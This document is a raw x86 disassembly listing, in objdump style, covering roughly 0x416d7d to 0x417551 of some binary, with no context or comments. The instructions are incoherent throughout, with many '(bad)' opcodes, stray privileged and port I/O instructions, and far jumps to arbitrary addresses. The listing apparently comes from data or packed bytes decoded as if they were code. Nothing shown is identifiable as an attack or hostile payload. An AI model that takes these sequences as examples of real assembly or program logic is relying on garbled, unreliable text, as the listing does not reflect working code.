  416d7d:	fistp  WORD PTR [edx+ecx*1-0x44]
  416d81:	xchg   esi,eax
  416d82:	push   ecx
  416d83:	cmp    BYTE PTR [eax],ch
  416d85:	cli    
  416d86:	pushf  
  416d87:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416d88:	push   ebx
  416d89:	or     BYTE PTR [esi-0x5338d81b],dh
  416d8f:	clc    
  416d90:	push   es
  416d91:	adc    eax,0x76c338a1
  416d96:	into   
  416d97:	add    eax,0x41501b5c
  416d9c:	add    ebp,DWORD PTR [ecx+eiz*1]
  416d9f:	imul   BYTE PTR [edi]
  416da1:	mov    eax,ds:0x9e04dc3f
  416da6:	mov    ah,0xcd
  416da8:	scas   eax,DWORD PTR es:[edi]
  416da9:	sbb    DWORD PTR [ebp+0x1e7548cc],eax
  416daf:	es ss out dx,eax
  416db2:	jae    0x416d4c
  416db4:	shl    BYTE PTR [eax],1
  416db6:	lock dec edi
  416db8:	push   0xffffffac
  416dba:	or     BYTE PTR [ebx],dh
  416dbc:	rcr    BYTE PTR [edi+0x27],0xe1
  416dc0:	mov    WORD PTR [esi+0x70],?
  416dc3:	mov    eax,0xef1012be
  416dc8:	repz pop esi
  416dca:	in     al,0x2e
  416dcc:	shr    BYTE PTR [esi-0x7b108ba6],cl
  416dd2:	test   esp,edx
  416dd4:	add    ecx,ecx
  416dd6:	in     al,0x2d
  416dd8:	or     cl,dl
  416dda:	sub    al,0x6d
  416ddc:	out    0xeb,eax
  416dde:	rcl    DWORD PTR [edx-0x65],0x4c
  416de2:	mov    DWORD PTR [edx-0x57],esp
  416de5:	xor    al,0x2b
  416de7:	pop    ecx
  416de8:	cmp    al,0x65
  416dea:	mov    bh,0xd3
  416dec:	xor    DWORD PTR ds:0x5bfa1abb,eax
  416df2:	int    0xe9
  416df4:	retf   
  416df5:	push   ds
  416df6:	pop    esi
  416df7:	and    BYTE PTR [esi-0xd],0x9b
  416dfb:	inc    ebx
  416dfc:	ret    
  416dfd:	popa   
  416dfe:	lds    eax,FWORD PTR [ebx-0x9]
  416e01:	(bad)  
  416e02:	mov    bh,0x8d
  416e04:	jle    0x416dac
  416e06:	popa   
  416e07:	repz sub DWORD PTR [edx],esi
  416e0a:	xor    eax,0x72be1ca4
  416e0f:	das    
  416e10:	pop    esp
  416e11:	mov    ?,WORD PTR [ebx-0x4843e9d6]
  416e17:	push   cs
  416e18:	test   DWORD PTR [edi],esp
  416e1a:	aaa    
  416e1b:	in     al,dx
  416e1c:	enter  0x1d6a,0x0
  416e20:	push   esi
  416e21:	stos   BYTE PTR es:[edi],al
  416e22:	jl     0x416dca
  416e24:	mov    edx,0x780f69d5
  416e29:	inc    esp
  416e2a:	inc    ecx
  416e2b:	jle    0x416dcd
  416e2d:	addr16 cli 
  416e2f:	adc    al,0xbf
  416e31:	jl     0x416deb
  416e33:	or     DWORD PTR [ebx],0x45
  416e36:	xchg   ecx,eax
  416e37:	mov    esp,0x8a398426
  416e3c:	and    al,0x64
  416e3e:	fs mov ch,0x27
  416e41:	mov    ah,0x5d
  416e43:	imul   ecx,DWORD PTR [eax+eiz*8+0x4977313e],0x35
  416e4b:	xchg   esp,eax
  416e4c:	mov    ebp,0xad958065
  416e51:	cmp    DWORD PTR [eax+0x7b],eax
  416e54:	cmp    al,BYTE PTR [ebx]
  416e56:	aas    
  416e57:	sbb    DWORD PTR [edx+0x542d7356],0x50e3d11b
  416e61:	xor    al,0x9
  416e63:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416e64:	(bad)  
  416e65:	mov    ecx,0xce7fb5ec
  416e6a:	sbb    al,0xc0
  416e6c:	dec    ebp
  416e6d:	mov    ebp,0xa5bab7
  416e72:	mov    cr2,edx
  416e75:	pop    ds
  416e76:	mov    al,ds:0x2fc5e570
  416e7b:	xchg   cl,dh
  416e7d:	cld    
  416e7e:	xchg   ebp,eax
  416e7f:	push   es
  416e80:	cli    
  416e81:	adc    eax,0x6ffc7701
  416e86:	shr    DWORD PTR es:[esi+0x30],1
  416e8a:	dec    esp
  416e8b:	xchg   BYTE PTR [ecx],ah
  416e8d:	repz jno 0x416eed
  416e90:	or     DWORD PTR [ebp+0x1f],0xffffff97
  416e94:	(bad)  
  416e95:	lahf   
  416e96:	pusha  
  416e97:	(bad)  
  416e98:	(bad)  
  416e99:	fucompp 
  416e9b:	jmp    0x416e30
  416e9d:	test   ebp,ebx
  416e9f:	scas   eax,DWORD PTR es:[edi]
  416ea0:	in     eax,0x13
  416ea2:	and    DWORD PTR [edi],ebp
  416ea4:	(bad)  
  416ea5:	(bad)  
  416ea6:	or     BYTE PTR ds:0x1f5144b8,dl
  416eac:	(bad)  
  416ead:	test   edi,0x3e86fc4
  416eb3:	jle    0x416f07
  416eb5:	cmp    ecx,DWORD PTR [eax-0x38287f3f]
  416ebb:	push   ss
  416ebc:	inc    eax
  416ebd:	out    0x93,eax
  416ebf:	or     al,0xc9
  416ec1:	ins    BYTE PTR es:[edi],dx
  416ec2:	daa    
  416ec3:	mov    ecx,0x22feb6e0
  416ec8:	icebp  
  416ec9:	sbb    edi,DWORD PTR [esi-0x34]
  416ecc:	push   ecx
  416ecd:	cld    
  416ece:	add    bl,BYTE PTR cs:[eax+0x1775e160]
  416ed5:	mov    ecx,0x628c6a8b
  416eda:	mov    esi,0xc41de7f1
  416edf:	sahf   
  416ee0:	int3   
  416ee1:	sub    BYTE PTR [ecx-0x228d9875],0xec
  416ee8:	shr    DWORD PTR [ebp+0x738984b9],0x7c
  416eef:	sbb    cl,bh
  416ef1:	lds    esp,FWORD PTR [ebp+0x2cd1dd6a]
  416ef7:	sub    bh,BYTE PTR [eax]
  416ef9:	ja     0x416ec5
  416efb:	sub    DWORD PTR [esi+0x70b0616d],esi
  416f01:	push   0x6ae30892
  416f06:	fld    st(2)
  416f08:	xchg   ecx,eax
  416f09:	or     ecx,0x51bf8489
  416f0f:	mov    dl,0x98
  416f11:	ins    BYTE PTR es:[edi],dx
  416f12:	fscale 
  416f14:	pusha  
  416f15:	test   BYTE PTR [ecx+0x28],dl
  416f18:	inc    esi
  416f19:	add    ebx,DWORD PTR [edi+ebp*1]
  416f1c:	fldenv [edi-0x54]
  416f1f:	xor    edi,DWORD PTR ds:0x9228f035
  416f25:	or     DWORD PTR [edx],eax
  416f27:	jb     0x416f2b
  416f29:	xchg   esp,eax
  416f2a:	stos   BYTE PTR es:[edi],al
  416f2b:	or     al,0x87
  416f2d:	push   esi
  416f2e:	jb     0x416f52
  416f30:	imul   ebp,DWORD PTR [ecx-0x5c],0xffffffc9
  416f34:	call   0xa0a5c76
  416f39:	add    eax,0x945518eb
  416f3e:	(bad)  
  416f3f:	mov    cl,0x1a
  416f41:	mov    ecx,0x94b2df35
  416f46:	std    
  416f47:	dec    esp
  416f48:	push   esi
  416f49:	dec    ebp
  416f4a:	in     al,0x80
  416f4c:	stos   BYTE PTR es:[edi],al
  416f4d:	test   DWORD PTR [edi-0x12048203],esi
  416f53:	clc    
  416f54:	pusha  
  416f55:	adc    DWORD PTR [ebp+0x3efe4a62],0x1
  416f5c:	inc    eax
  416f5d:	sub    esi,esi
  416f5f:	mov    eax,ds:0xc556bc55
  416f64:	pop    esi
  416f65:	sar    DWORD PTR [ebx-0x28],0x26
  416f69:	and    BYTE PTR [edi+0x2d83f9a2],0x75
  416f70:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416f71:	dec    eax
  416f72:	shl    DWORD PTR [ebx-0x43],1
  416f75:	add    BYTE PTR [edi+0x16783fde],dl
  416f7b:	enter  0x5afe,0xcd
  416f7f:	ins    BYTE PTR es:[edi],dx
  416f80:	stos   BYTE PTR es:[edi],al
  416f81:	jp     0x416f2f
  416f83:	jg     0x416fb2
  416f85:	mov    ebx,0xe6f85a09
  416f8a:	dec    ecx
  416f8b:	ds or  eax,0x397abb6f
  416f91:	out    dx,eax
  416f92:	sahf   
  416f93:	lds    eax,FWORD PTR [eax]
  416f95:	or     ebx,DWORD PTR [edi]
  416f97:	(bad)
  416f9a:	lea    edx,[eax-0x4c]
  416f9d:	loop   0x416fcc
  416f9f:	imul   al
  416fa1:	mov    ah,0x53
  416fa3:	mov    fs,WORD PTR [eax]
  416fa5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416fa6:	lea    ecx,[ecx-0x13]
  416fa9:	jb     0x416f34
  416fab:	cmp    al,0x7c
  416fad:	jnp    0x416f30
  416faf:	mov    ah,0x1
  416fb1:	test   eax,0xe736c529
  416fb6:	loop   0x416ffa
  416fb8:	retf   0x9695
  416fbb:	push   ds
  416fbc:	xor    esi,0x70
  416fbf:	in     al,0xd3
  416fc1:	rol    ch,cl
  416fc3:	int    0x2a
  416fc5:	inc    eax
  416fc6:	retf   
  416fc7:	jg     0x417014
  416fc9:	nop
  416fca:	stc    
  416fcb:	xor    eax,0x9ea7de71
  416fd0:	jmp    0x5b35d8c5
  416fd5:	mov    ah,0xb9
  416fd7:	mov    edx,0xe402063e
  416fdc:	jmp    0x90855068
  416fe1:	imul   esi,ecx,0x2bc16e6f
  416fe7:	ficomp DWORD PTR [esi-0x60b1fd9b]
  416fed:	repz cdq 
  416fef:	mov    edx,DWORD PTR [ebx+esi*1]
  416ff2:	jo     0x417031
  416ff4:	ins    BYTE PTR es:[edi],dx
  416ff5:	int3   
  416ff6:	mov    bl,0xb0
  416ff8:	lods   eax,DWORD PTR ds:[esi]
  416ff9:	jb     0x416fbf
  416ffb:	sar    DWORD PTR [edx],1
  416ffd:	push   edx
  416ffe:	add    DWORD PTR [ebx],edi
  417000:	retf   
  417001:	lock and DWORD PTR ds:[esi+0x2a075add],esp
  417009:	xchg   esp,eax
  41700a:	sub    dh,BYTE PTR [esi]
  41700c:	loope  0x416fa8
  41700e:	dec    ebx
  41700f:	idiv   BYTE PTR [esi+0x31]
  417012:	pop    ebx
  417013:	cmc    
  417014:	push   edi
  417015:	mov    BYTE PTR [edx+0x6e],bh
  417018:	fcomp  st(6)
  41701a:	(bad)  
  41701b:	loop   0x417048
  41701d:	lods   al,BYTE PTR ds:[esi]
  41701e:	mov    al,ds:0xcd4b02aa
  417023:	push   esp
  417024:	fwait
  417025:	nop
  417026:	test   ebx,esi
  417028:	gs arpl ax,sp
  41702b:	cmc    
  41702c:	xor    BYTE PTR [edx],bl
  41702e:	mov    esp,0x170667d4
  417033:	out    0xb8,eax
  417035:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417036:	fadd   st,st(0)
  417038:	stos   DWORD PTR es:[edi],eax
  417039:	push   ss
  41703a:	sub    ebp,esi
  41703c:	jmp    0xbfbc2b84
  417041:	bound  esp,QWORD PTR [edx+0x18]
  417044:	fucomip st,st(6)
  417046:	mov    esi,0x151fbb84
  41704b:	xor    BYTE PTR [ecx+ebp*8],dl
  41704e:	sbb    ax,0xfa5e
  417052:	add    DWORD PTR [ebx+0x3aacb207],ebp
  417058:	sbb    al,0xeb
  41705a:	fucomi st,st(3)
  41705c:	sub    dh,BYTE PTR [esi+0x3b263dd8]
  417062:	push   0x38
  417064:	push   ss
  417065:	mov    edx,0x2108284f
  41706a:	clc    
  41706b:	and    DWORD PTR [ecx-0xad65330],edx
  417071:	es stos BYTE PTR es:[edi],al
  417073:	ds lahf 
  417075:	mov    eax,ds:0xde0b4e31
  41707a:	test   ebx,ecx
  41707c:	mov    cl,0x1
  41707e:	popf   
  41707f:	or     DWORD PTR [ebx],0x3cfbf7fa
  417085:	mov    WORD PTR [ebx+0x9],cs
  417088:	inc    ebx
  417089:	(bad)
  41708c:	pop    ebp
  41708d:	and    al,0x6b
  41708f:	pop    ebx
  417090:	jl     0x417061
  417092:	push   ds
  417093:	cld    
  417094:	push   ebp
  417095:	sub    eax,0x7acb3d00
  41709a:	jne    0x417115
  41709c:	out    dx,eax
  41709d:	push   ebp
  41709e:	into   
  41709f:	mov    edi,0xc4e48bf2
  4170a4:	and    edi,ecx
  4170a6:	rcl    BYTE PTR [ecx],0x9f
  4170a9:	xchg   BYTE PTR [ebp+0x1],ah
  4170ac:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4170ad:	inc    ecx
  4170ae:	and    bh,BYTE PTR [eax-0x52]
  4170b1:	icebp  
  4170b2:	and    al,0x16
  4170b4:	nop
  4170b5:	fdiv   QWORD PTR [ebx+0x69]
  4170b8:	xchg   esp,eax
  4170b9:	sub    BYTE PTR ds:[eax],0xb
  4170bd:	mov    cr2,ebx
  4170c0:	lahf   
  4170c1:	mov    ebp,0x60c3e981
  4170c6:	xlat   BYTE PTR ds:[ebx]
  4170c7:	add    eax,0x4f26ad36
  4170cc:	mov    edi,0x5ff0044c
  4170d1:	inc    edi
  4170d2:	aam    0x2c
  4170d4:	fisub  DWORD PTR [esi-0x4d]
  4170d7:	arpl   bx,si
  4170d9:	iret   
  4170da:	mov    eax,ds:0x595ff54f
  4170df:	retf   
  4170e0:	mov    cl,0xd0
  4170e2:	fcomp  DWORD PTR [ebx+0x70]
  4170e5:	cmc    
  4170e6:	test   BYTE PTR [ecx+0x2f],0x31
  4170ea:	icebp  
  4170eb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4170ec:	mov    eax,ds:0xea7cadc8
  4170f1:	(bad)  
  4170f2:	or     ah,BYTE PTR [ebx]
  4170f4:	and    eax,0xede23edb
  4170f9:	data16 xchg BYTE PTR [ecx-0x30],bl
  4170fd:	sbb    BYTE PTR [esi],al
  4170ff:	sbb    eax,0x3f78e06c
  417104:	xchg   edi,eax
  417105:	aam    0x5a
  417107:	xor    eax,0xac7cd629
  41710c:	mov    eax,ds:0x6e676153
  417111:	rcl    BYTE PTR [esi+0x2c91ef18],1
  417117:	bound  ebp,QWORD PTR [ebp+0x40]
  41711a:	cmp    al,BYTE PTR [ebx+0x42fa525a]
  417120:	ds ds retf 
  417123:	rcr    BYTE PTR [edx],1
  417125:	loope  0x4170b3
  417127:	cld    
  417128:	add    BYTE PTR [ebx+0x40],0xdd
  41712c:	cmp    bh,bh
  41712e:	test   eax,0xfe7ef8df
  417133:	ss jmp 0x417142
  417136:	add    DWORD PTR [ecx+esi*1+0x73],esi
  41713a:	inc    esi
  41713b:	jo     0x4170f2
  41713d:	dec    ebp
  41713e:	hlt    
  41713f:	cmp    ebp,edi
  417141:	push   ebx
  417142:	mov    BYTE PTR [eax-0x4334c17e],ah
  417148:	mov    bl,BYTE PTR [ecx]
  41714a:	fstp   TBYTE PTR [esi+0x3b93f968]
  417150:	sub    eax,0x428fb83a
  417155:	aam    0x84
  417157:	loop   0x4170e4
  417159:	into   
  41715a:	in     al,dx
  41715b:	sub    eax,0x3aee8457
  417160:	cmc    
  417161:	cmc    
  417162:	lock jl 0x417151
  417165:	xchg   edi,eax
  417166:	(bad)  
  417167:	push   edx
  417168:	sar    DWORD PTR [ecx-0x2e5928c3],1
  41716e:	mov    dh,0x57
  417170:	push   ss
  417171:	fild   WORD PTR [eax]
  417173:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417174:	rcl    BYTE PTR [ecx+eax*1-0x6],cl
  417178:	mov    eax,0x94b082fb
  41717d:	fwait
  41717e:	push   ebp
  41717f:	dec    edx
  417180:	div    ch
  417182:	push   ebx
  417183:	jnp    0x417137
  417185:	xchg   esp,eax
  417186:	jo     0x4171cb
  417188:	jmp    0x747aaf2f
  41718d:	aad    0x89
  41718f:	xchg   ebp,edi
  417191:	ret    
  417192:	mov    bl,0x26
  417194:	lock mov ?,esp
  417197:	(bad)  
  417199:	popf   
  41719a:	adc    BYTE PTR gs:[edi],0x29
  41719e:	inc    esi
  41719f:	mov    esp,0xeb983cf
  4171a4:	jmp    0x8f69:0x89377f56
  4171ab:	mov    ch,0xc3
  4171ad:	int    0xa3
  4171af:	adc    eax,edi
  4171b1:	mov    ecx,0x3149146f
  4171b6:	stos   BYTE PTR es:[edi],al
  4171b7:	and    bh,BYTE PTR [esi-0xac0f619]
  4171bd:	jb     0x4171ce
  4171bf:	js     0x417234
  4171c1:	(bad)  
  4171c3:	xor    al,0xe9
  4171c5:	out    0xb6,al
  4171c7:	loop   0x417231
  4171c9:	jae    0x417249
  4171cb:	cmp    edx,esi
  4171cd:	push   ebp
  4171ce:	scas   al,BYTE PTR es:[edi]
  4171cf:	jmp    0x4171f7
  4171d1:	aas    
  4171d2:	mov    ds:0xe319ac91,al
  4171d7:	pop    es
  4171d8:	int3   
  4171d9:	inc    ecx
  4171da:	cmp    DWORD PTR [edx],ebp
  4171dc:	inc    ebx
  4171dd:	test   BYTE PTR [eax+0xf],cl
  4171e0:	int    0x4b
  4171e2:	jmp    0x3a735bb
  4171e7:	addr16 inc ebx
  4171e9:	jne    0x41723e
  4171eb:	cmc    
  4171ec:	cdq    
  4171ed:	and    BYTE PTR [ecx-0x2d],ah
  4171f0:	push   cs
  4171f1:	iret   
  4171f2:	test   BYTE PTR [eax-0x5b494b2a],0xe
  4171f9:	inc    ecx
  4171fa:	or     BYTE PTR [edx-0x49],ch
  4171fd:	data16 fcom QWORD PTR [ebx]
  417200:	(bad)  
  417201:	loopne 0x4171c5
  417203:	rol    DWORD PTR [eax-0x68],1
  417206:	mov    al,ds:0x1a29f997
  41720b:	std    
  41720c:	adc    eax,0x8341c858
  417211:	sbb    al,0x8b
  417213:	rcl    DWORD PTR [ebp+0xe778a81],1
  417219:	xor    ch,al
  41721b:	mov    bl,0xbf
  41721d:	test   DWORD PTR ds:0xe2b4caf6,ebx
  417223:	cmp    dl,BYTE PTR [esi-0x41]
  417226:	es sub eax,0xfe2b1729
  41722c:	lods   al,BYTE PTR ds:[esi]
  41722d:	mov    dh,0x75
  41722f:	cli    
  417230:	int3   
  417231:	jno    0x41723f
  417233:	jne    0x417233
  417235:	jnp    0x417254
  417237:	or     ch,BYTE PTR [eax]
  417239:	mov    edx,0x52769843
  41723e:	xor    DWORD PTR [edi],esi
  417240:	mov    ecx,0x30a1acd2
  417245:	ja     0x41720b
  417247:	js     0x4172b6
  417249:	mov    BYTE PTR [ecx],al
  41724b:	loop   0x417210
  41724d:	ret    0xee08
  417250:	xor    eax,edi
  417252:	mov    cl,0x36
  417254:	mov    al,BYTE PTR cs:[esi]
  417257:	out    0xc4,al
  417259:	aaa    
  41725a:	fisub  DWORD PTR [esi-0x3b]
  41725d:	or     BYTE PTR [ecx+0x2b],al
  417260:	fisubr WORD PTR [ebx+0x6b]
  417263:	or     bh,BYTE PTR [esp+eax*1]
  417266:	mov    dl,0x85
  417268:	cmp    al,0x32
  41726a:	outs   dx,BYTE PTR ds:[esi]
  41726b:	rol    DWORD PTR [ecx+esi*4],cl
  41726e:	in     eax,dx
  41726f:	mov    ebp,0xbcf6b171
  417274:	sbb    BYTE PTR [ebx-0x33],0x42
  417278:	repnz push ss
  41727a:	(bad)  
  41727b:	jbe    0x4172d0
  41727d:	jg     0x417276
  41727f:	in     eax,dx
  417280:	scas   eax,DWORD PTR es:[edi]
  417281:	stos   DWORD PTR es:[edi],eax
  417282:	and    BYTE PTR [ebx-0xa3d341b],ch
  417288:	and    eax,0x32c4082
  41728d:	rcl    DWORD PTR [esi-0x6c229460],1
  417293:	cwde   
  417294:	mov    edi,DWORD PTR [edx]
  417296:	cs jo  0x417301
  417299:	xchg   ebp,eax
  41729a:	inc    edi
  41729b:	add    dh,bl
  41729d:	xchg   ebp,eax
  41729e:	jbe    0x417233
  4172a0:	and    ch,dl
  4172a2:	push   ss
  4172a3:	push   ebx
  4172a4:	das    
  4172a5:	adc    edx,DWORD PTR [ebx+0x46]
  4172a8:	aas    
  4172a9:	cmc    
  4172aa:	mov    fs,WORD PTR [ecx]
  4172ac:	je     0x417273
  4172ae:	or     eax,0xebe58c95
  4172b3:	xchg   edi,eax
  4172b4:	fwait
  4172b5:	push   esi
  4172b6:	sbb    DWORD PTR ds:0x93b6779a,eax
  4172bc:	inc    ebp
  4172bd:	mov    dh,0x1
  4172bf:	mov    dh,0x34
  4172c1:	fbstp  TBYTE PTR [ebx-0x6c]
  4172c4:	test   DWORD PTR [ecx+0x62496420],eax
  4172ca:	loopne 0x417260
  4172cc:	(bad)  
  4172cd:	fcom   st(2)
  4172cf:	mov    ch,0xab
  4172d1:	add    DWORD PTR [eax+0x17],esi
  4172d4:	das    
  4172d5:	lods   eax,DWORD PTR ds:[esi]
  4172d6:	mov    DWORD PTR [ebx+eax*1+0x7f],ebx
  4172da:	mov    edi,0x92d8dc2c
  4172df:	mov    edx,DWORD PTR [ebx]
  4172e1:	sbb    al,cl
  4172e3:	test   eax,0xb265ec4f
  4172e8:	mov    esp,DWORD PTR [ebx+0x1ffeaad5]
  4172ee:	push   0xac21370e
  4172f3:	in     eax,dx
  4172f4:	imul   edi,DWORD PTR [ebp+0x4bf46566],0xa5169131
  4172fe:	and    eax,0x4479056b
  417303:	loope  0x4172c0
  417305:	lods   eax,DWORD PTR ds:[esi]
  417306:	push   0x1d66eb3f
  41730b:	xchg   ch,al
  41730d:	(bad)  
  41730e:	repz std 
  417310:	cmp    BYTE PTR [edx+0x55],bh
  417313:	cs pop eax
  417315:	test   DWORD PTR [ebp-0x38],eax
  417318:	jg     0x4172b5
  41731a:	out    0x1e,al
  41731c:	push   ss
  41731d:	mov    dl,0x54
  41731f:	jmp    0x4172df
  417321:	scas   al,BYTE PTR es:[edi]
  417322:	outs   dx,BYTE PTR ds:[esi]
  417323:	mov    esp,0x6cbdaa3f
  417328:	jo     0x4173a1
  41732a:	dec    ecx
  41732b:	dec    esp
  41732c:	mov    al,0x3e
  41732e:	sub    eax,0x95c07b7c
  417333:	and    BYTE PTR [edi+ebx*4-0x74],dl
  417337:	sbb    al,0x53
  417339:	push   ecx
  41733a:	cdq    
  41733b:	icebp  
  41733c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41733d:	arpl   WORD PTR [ebp+0x4f],sp
  417340:	call   0x7a15:0x1feaa9c4
  417347:	jp     0x41733d
  417349:	pop    edi
  41734a:	and    BYTE PTR [edx+edi*2+0x3c9067e9],bl
  417351:	jg     0x417390
  417353:	fild   QWORD PTR [ecx+0x47]
  417356:	mov    edx,0x9861fa5f
  41735b:	sub    bh,dl
  41735d:	dec    edx
  41735e:	xor    BYTE PTR [ebx-0xfc38e5c],bh
  417364:	scas   al,BYTE PTR es:[edi]
  417365:	lahf   
  417366:	repnz sbb al,0x5b
  417369:	dec    ebx
  41736a:	fldlg2 
  41736c:	cmp    BYTE PTR [esi-0x3890c557],dh
  417372:	ja     0x417387
  417374:	jno    0x417344
  417376:	out    0x37,eax
  417378:	sbb    ah,ah
  41737a:	popf   
  41737b:	daa    
  41737c:	stos   BYTE PTR es:[edi],al
  41737d:	pop    edi
  41737e:	std    
  41737f:	add    al,0x5
  417381:	mov    ch,0x77
  417383:	add    eax,DWORD PTR [esi-0x41]
  417386:	mov    esi,0x1ef45e03
  41738b:	imul   ecx,DWORD PTR [eax+0x4a],0xbb383902
  417392:	pop    ecx
  417393:	ja     0x4173fe
  417395:	dec    eax
  417396:	xchg   ecx,eax
  417397:	sti    
  417398:	push   0xffffffc2
  41739a:	sub    al,0xd
  41739c:	jae    0x4173ec
  41739e:	or     DWORD PTR [edx-0x6ad8f7d0],0x39
  4173a5:	pop    eax
  4173a6:	or     eax,0x7faad45
  4173ab:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4173ac:	cmp    al,0x33
  4173ae:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4173af:	daa    
  4173b0:	push   es
  4173b1:	dec    edi
  4173b2:	jnp    0x4173d2
  4173b4:	mov    edi,0xa0879fd7
  4173b9:	movq   mm6,QWORD PTR [ebx+0x39]
  4173bd:	add    ecx,DWORD PTR es:[ebx+eiz*4+0x2bf3c91e]
  4173c5:	shr    edx,1
  4173c7:	sub    eax,edi
  4173c9:	mov    DWORD PTR [ebx+edx*8-0x5c],ecx
  4173cd:	add    DWORD PTR [ebx],ecx
  4173cf:	xor    DWORD PTR [ebx+0x1d],eax
  4173d2:	mov    ds:0x2a8214e2,eax
  4173d7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4173d8:	dec    esp
  4173d9:	jp     0x417449
  4173db:	(bad)  
  4173dc:	fnstcw WORD PTR [esi]
  4173de:	xor    bl,BYTE PTR [edi-0x78]
  4173e1:	adc    ah,BYTE PTR [esi+ecx*2+0x72f66462]
  4173e8:	popf   
  4173e9:	sub    al,0x73
  4173eb:	es push es
  4173ed:	aad    0x9c
  4173ef:	das    
  4173f0:	int    0xe3
  4173f2:	lds    ebp,FWORD PTR [ecx-0x2]
  4173f5:	fisub  DWORD PTR [ebx-0x2e]
  4173f8:	or     al,0xc9
  4173fa:	mov    ds:0xa445e8e5,eax
  4173ff:	mov    ds,WORD PTR [edx+0x2ca3aee5]
  417405:	xor    dl,BYTE PTR [ebx-0x4f]
  417408:	cmp    eax,0xe93cb9aa
  41740d:	cli    
  41740e:	push   ss
  41740f:	enter  0x14c,0x9f
  417413:	add    BYTE PTR ds:0xc062cba3,dh
  417419:	sub    BYTE PTR [ebx],bh
  41741b:	adc    BYTE PTR [ebx-0x1b1cd9cd],ch
  417421:	push   ebx
  417422:	jg     0x4173c0
  417424:	jbe    0x41748f
  417426:	into   
  417427:	jo     0x4173cd
  417429:	fld    QWORD PTR [ecx-0x45]
  41742c:	mov    ah,0x64
  41742e:	or     eax,0x954a0ca9
  417433:	sub    al,0x52
  417435:	adc    ebx,DWORD PTR [ebp+0x72]
  417438:	xchg   esp,eax
  417439:	stos   BYTE PTR es:[edi],al
  41743a:	imul   BYTE PTR [ebx+0x6f]
  41743d:	jmp    0x6b0ead69
  417442:	imul   esi,DWORD PTR [ebp-0xe3adfef],0xffffffef
  417449:	aad    0x28
  41744b:	push   ds
  41744c:	cs pop esi
  41744e:	dec    edi
  41744f:	loope  0x41744b
  417451:	push   es
  417452:	in     eax,dx
  417453:	dec    ecx
  417454:	cmp    BYTE PTR [ebx],ah
  417456:	jne    0x4173eb
  417458:	jg     0x41742c
  41745a:	push   edx
  41745b:	cmp    eax,0xfcca279b
  417460:	loope  0x41746c
  417462:	mov    WORD PTR [eax-0x45],gs
  417465:	or     esi,edx
  417467:	dec    ebp
  417468:	jb     0x4174b9
  41746a:	repz xor BYTE PTR [edi],0x4f
  41746e:	dec    ebp
  41746f:	jb     0x41747b
  417471:	loopne 0x4174da
  417473:	mov    ah,0xde
  417475:	add    eax,0xa71a8d6e
  41747a:	mov    ebx,0xa9702569
  41747f:	mov    dl,0xa8
  417481:	scas   al,BYTE PTR es:[edi]
  417482:	dec    edx
  417483:	test   al,0xe4
  417485:	xchg   edi,eax
  417486:	add    dh,BYTE PTR [ebx-0x2d]
  417489:	pusha  
  41748a:	mov    esi,0x3c292c6b
  41748f:	pop    ebp
  417490:	and    eax,0x824e3618
  417495:	(bad)  
  417496:	sbb    DWORD PTR [eax],ecx
  417498:	cmp    DWORD PTR [esi+0x21],ebx
  41749b:	test   eax,0xb3eb5650
  4174a0:	and    ch,BYTE PTR [ecx]
  4174a2:	or     eax,0x7458ba0b
  4174a7:	enter  0xd7fd,0x40
  4174ab:	sahf   
  4174ac:	cdq    
  4174ad:	retf   
  4174ae:	cmp    BYTE PTR [edi],ch
  4174b0:	cmps   DWORD PTR es:[esi],DWORD PTR es:[edi]
  4174b2:	xor    eax,0xe43f93db
  4174b7:	bound  ebx,QWORD PTR [esi-0x6a]
  4174ba:	std    
  4174bb:	mov    dh,0x49
  4174bd:	frstor [eax-0x811699a]
  4174c3:	js     0x41752b
  4174c5:	jg     0x417508
  4174c7:	mov    dh,0xf5
  4174c9:	inc    edx
  4174ca:	push   edx
  4174cb:	mov    edx,0xf934e8ee
  4174d0:	call   0xc31b963
  4174d5:	mov    edi,0xac1da555
  4174da:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4174db:	rcr    dl,0xaf
  4174de:	jo     0x417502
  4174e0:	pusha  
  4174e1:	ror    BYTE PTR [ecx-0x3bfe955],cl
  4174e7:	pushf  
  4174e8:	or     BYTE PTR [eax+0x7f],0xef
  4174ec:	jmp    0xa46a:0xd216eed2
  4174f3:	inc    ecx
  4174f4:	ins    BYTE PTR es:[edi],dx
  4174f5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4174f6:	shr    DWORD PTR [esi+0x78],1
  4174f9:	mov    ecx,0x5e520e2f
  4174fe:	outs   dx,DWORD PTR ds:[esi]
  4174ff:	arpl   bx,di
  417501:	scas   eax,DWORD PTR es:[edi]
  417502:	aaa    
  417503:	outs   dx,BYTE PTR ds:[esi]
  417504:	(bad)  
  417505:	out    dx,eax
  417506:	fwait
  417507:	mov    ?,esi
  417509:	stos   DWORD PTR es:[edi],eax
  41750a:	mov    dh,0xb7
  41750c:	fwait
  41750d:	cmp    BYTE PTR [eax+0x42],dh
  417510:	xchg   BYTE PTR [ecx+eiz*4-0x71],dl
  417514:	add    ecx,DWORD PTR [edx+0x66171258]
  41751a:	idiv   dl
  41751c:	repz pusha 
  41751e:	inc    edx
  41751f:	adc    eax,ebp
  417521:	mov    edx,0x6d15cfc
  417526:	(bad)  
  417527:	cdq    
  417528:	jo     0x4174de
  41752a:	xor    al,0x78
  41752c:	push   esi
  41752d:	push   es
  41752e:	and    dl,BYTE PTR [esi-0x76]
  417531:	dec    ecx
  417532:	jg     0x417532
  417534:	mov    esp,0x44913e62
  417539:	push   edx
  41753a:	repz lahf 
  41753c:	(bad)  
  41753d:	call   0xbbf7:0x9ccbe4af
  417544:	cmp    dl,BYTE PTR [edx+0x6965ffca]
  41754a:	(bad)
  41754d:	jp     0x417569
  41754f:	jbe    0x41754d
  417551:	add    BYTE PTR ds:0x584d3544,al
